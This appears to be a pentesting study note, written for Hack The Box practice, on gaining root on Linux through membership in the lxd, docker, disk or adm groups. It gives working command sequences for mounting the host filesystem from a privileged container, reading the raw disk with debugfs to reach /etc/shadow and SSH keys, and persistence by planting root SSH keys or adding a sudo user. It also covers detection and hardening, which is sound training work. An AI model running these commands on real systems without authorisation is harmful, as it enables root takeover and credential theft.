---
id: deep-study-linux-privilege-escalation-privileged-groups
tags: [htb, pentesting, linux, privilege-escalation, containers, docker, lxd]
aliases: [Privileged Groups]
date: 2026-03-12
topic: Privileged Groups
type: deep-study
difficulty: intermediate
owner: vault-agent
status: draft
version: 1.1
last_updated: 2026-03-19
category: linux-privilege-escalation
tools: [id, groups, getent, docker, lxc, debugfs]
---

# Privileged Groups

## Related Topics

- [Linux Privilege Escalation](README.md)
- [Cron Job Abuse](cron-job-abuse.md)
- [Vulnerable Services](vulnerable-services.md)

## Concept Overview

Linux systems use groups to grant users access to specific resources or capabilities. While groups are often intended to allow controlled access to services or files, some groups provide extremely powerful permissions. If a user is mistakenly placed into one of these groups, an attacker who compromises that account can escalate privileges to root.

During Linux privilege escalation enumeration, checking group membership is a critical step because many privilege escalation paths originate from overly permissive groups.

```bash
id
```

This command reveals all groups associated with the current user.

## Quick Navigation

- [Enumeration Checklist](#enumeration-checklist)
- [Attack Methodology](#attack-methodology)
- [LXC / LXD Privilege Escalation](#lxc--lxd-privilege-escalation)
- [Docker Group Privilege Escalation](#docker-group-privilege-escalation)
- [Disk Group Privilege Escalation](#disk-group-privilege-escalation)
- [Detection Indicators](#detection-indicators)
- [Defensive Perspective](#defensive-perspective)

## Threat Context

- Objective: escalate privileges by abusing risky Linux group memberships.
- Precondition: attacker controls a user in `docker`, `lxd`, `disk`, or `adm`.
- Boundary: group-based capability model intended for operational convenience.

## Environment Snapshot

- Target type: Linux server/workstation in DevOps or shared admin workflows.
- Exposure: interactive shell with no direct sudo path.
- Constraints: exploit path depends on available tools and group assignments.

## Decision Tree

```text
User in privileged group?
    |
    +-- No -> Continue other Linux privesc checks
    +-- Yes
          |
          +-- docker -> Mount host path and extract root data
          +-- lxd -> Build privileged container and mount /
          +-- disk -> Read raw filesystem via block device
          +-- adm -> Mine logs for credentials and pivot clues
```

## Internal Mechanics

- Linux group membership grants capability access beyond standard file ACLs.
- Container groups (`docker`, `lxd`) can proxy root-equivalent operations on host resources.
- `disk` bypasses filesystem-level controls by allowing direct block-device reads.
- `adm` is usually information-disclosure focused, but often enables follow-on escalation.

## Enumeration Checklist

```bash
id
groups
cat /etc/group
getent group docker
getent group lxd
ls -l /var/log
docker ps 2>/dev/null
lxc list 2>/dev/null
```

## Attack Methodology

1. Enumerate group memberships (`id`, `groups`).
2. Prioritize high-impact groups (`docker`, `lxd`, `disk`).
3. Select exploit path based on available tooling and host constraints.
4. Validate privileged data access or root context.
5. Move to controlled post-exploitation collection.

## Decision Workflow

1. Run `id` and `groups` immediately after shell access.
2. If `docker` or `lxd` is present, prioritize container-based host access.
3. If `disk` is present, pivot to raw-device inspection and credential extraction.
4. If only `adm` is present, mine logs for pivot paths and credential disclosure.
5. Confirm privilege impact, then transition to post-exploitation actions.

## Attack Timeline

- T0: low-privilege access acquired.
- T1: group enumeration reveals privileged memberships.
- T2: attacker selects highest-impact path (docker/lxd/disk/adm).
- T3: host resources accessed via container mount or raw-device read.
- T4: credentials or root-level access confirmed.

## LXC / LXD Privilege Escalation

### How LXD Works

LXD is a container management platform used to run system containers. Containers share the host kernel but operate in isolated environments. Normally, user namespaces map container users to unprivileged host users.

However, when a container is configured as **privileged**, the root user inside the container maps directly to the root user on the host system.

If a user belongs to the `lxd` group, they can create and manage containers. This effectively gives them the ability to run containers with root privileges on the host.

### Attack Methodology

1. Confirm `lxd` group membership
2. Import a Linux container image
3. Create a privileged container
4. Mount the host filesystem
5. Access host files as root

## Attack Chain

1. Enumerate groups with `id` or `groups`
2. Identify membership in privileged group (`lxd`, `docker`, `disk`, `adm`)
3. Prepare exploitation method (container, disk access, log review)
4. Mount or access sensitive host resources
5. Retrieve credentials or escalate to root

## Attack Graph

Visual flow of the attack path from discovery to full compromise.

```
Enumeration
    |
    |-- id / groups
    |-- check /etc/group
    v
Vulnerability
    |
    |-- user in docker / lxd / disk / adm
    v
Exploit
    |
    |-- docker run -v /root:/mnt -it ubuntu
    |-- lxc init ... -c security.privileged=true
    |-- debugfs /dev/sda1
    v
Privilege Escalation
    |
    |-- read /etc/shadow
    |-- obtain root SSH keys
    v
Persistence
    |
    |-- add SSH key to /root/.ssh/authorized_keys
    |-- create new sudo user
```

## Practical Example

```bash
id
```

Example output:

```bash
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Import a container image:

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Create privileged container:

```bash
lxc init alpine r00t -c security.privileged=true
```

Mount host filesystem:

```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Start container and spawn shell:

```bash
lxc start r00t
lxc exec r00t /bin/sh
```

Now the attacker can access the host filesystem:

```bash
cd /mnt/root/root
```

## Evidence and Artifacts

- Command traces showing group enumeration and container launch activity.
- Container runtime logs with privileged profile and host mount events.
- Access patterns to sensitive paths (`/root`, `/etc/shadow`, `/dev/sd*`).
- Unusual log-access behavior for users newly leveraging `adm` permissions.

## Command Cheat Sheet

```bash
id
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
docker run -v /root:/mnt -it ubuntu
debugfs /dev/sda1
```

## Command Harvest

Commands below are the **key practical commands** eligible for the
global cheat sheet at `cheatsheets/Pentest Commands.md`.

```bash
id
groups
docker run -v /root:/mnt -it ubuntu
lxc exec r00t /bin/sh
debugfs /dev/sda1
```

## Tools

- `docker`
- `lxc`
- `debugfs`
- `getent`

## Common Mistakes

- Not checking `groups` or `id` after obtaining a shell
- Ignoring container groups (`docker`, `lxd`) during enumeration
- Assuming `adm` is harmless and skipping log review
- Forgetting that `disk` access bypasses filesystem permissions

## Real World Scenario

In many DevOps environments, developers are added to the `lxd` group so they can manage containers. If one developer account is compromised, the attacker can instantly escalate privileges using this method.

This misconfiguration is commonly seen in:

- CI/CD build servers
- development environments
- internal lab systems

## Docker Group Privilege Escalation

### Why Docker Is Dangerous

Members of the `docker` group can run containers. Containers can mount any directory from the host system.

Because Docker runs with root privileges, mounting sensitive directories effectively bypasses normal permission controls.

### Attack Example

```bash
docker run -v /root:/mnt -it ubuntu
```

Explanation:

- `-v /root:/mnt` mounts the host `/root` directory
- `-it ubuntu` starts an interactive Ubuntu container

Inside the container, the attacker can access root files:

```bash
cd /mnt
```

### Real World Scenario

Many organizations add developers to the docker group for convenience. If a developer workstation or SSH account is compromised, attackers can immediately gain root-level filesystem access.

## Disk Group Privilege Escalation

### Disk Group Capabilities

The `disk` group provides direct access to block devices located in `/dev`.

Example device:

```bash
/dev/sda1
```

Because these devices represent the entire filesystem, attackers can bypass file permission restrictions.

### Attack Technique

Using `debugfs`:

```bash
debugfs /dev/sda1
```

An attacker can read any file on the disk, including:

- `/etc/shadow`
- SSH private keys
- configuration files

### Real World Scenario

Misconfigured backup systems or monitoring tools sometimes add service accounts to the `disk` group. If these accounts are compromised, attackers gain unrestricted disk access.

## ADM Group Information Disclosure

### ADM Group Capabilities

Members of the `adm` group can read system logs stored in:

```bash
/var/log
```

Example:

```bash
id
```

Output:

```bash
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

### Why Logs Matter

Logs may contain sensitive information such as:

- user activity
- authentication attempts
- scheduled jobs
- application errors

### Example Data in Logs

- plaintext credentials
- internal IP addresses
- backup scripts
- API tokens

### Pentester Strategy

Review logs to identify:

- privileged user activity
- automation scripts
- cron jobs
- misconfigured services

## Detection Indicators

- Creation of privileged containers
- Docker containers mounting host root directories
- Direct access to block devices such as `/dev/sda1`
- Unusual or large-scale log file access from non-admin users

## Defensive Perspective

Administrators should:

- avoid unnecessary group memberships
- restrict `docker` and `lxd` access
- monitor group assignments
- audit privileged groups regularly

Security monitoring should also alert when:

- containers mount root filesystem
- users access raw disk devices
- unusual log access occurs

## Recovery and Hardening Path

- Remove unnecessary users from privileged groups and enforce least privilege.
- Add approval workflow for membership changes in high-risk groups.
- Restrict privileged container operations and host path mounts.
- Audit historical access and rotate secrets exposed through disk/log abuse.

## Practice Lab Idea

1. Create a Linux VM
2. Add a test user to the `docker` or `lxd` group
3. Log in as that user and enumerate groups
4. Mount a sensitive directory using a container
5. Access `/root` or `/etc/shadow` to simulate privilege escalation

## Key Insights

- Group membership can be equivalent to root privileges
- `lxd` and `docker` are among the most common privilege escalation vectors
- `disk` group bypasses filesystem permissions
- `adm` group enables information gathering for further attacks

Always enumerate groups early during Linux privilege escalation.

## HTB / Exam Tips

- Immediately check `id` after obtaining a shell
- Container groups (`docker`, `lxd`) often provide quick privilege escalation
- Disk access can bypass filesystem permissions entirely
- Log access (`adm`) may reveal credentials, cron jobs, or automation scripts
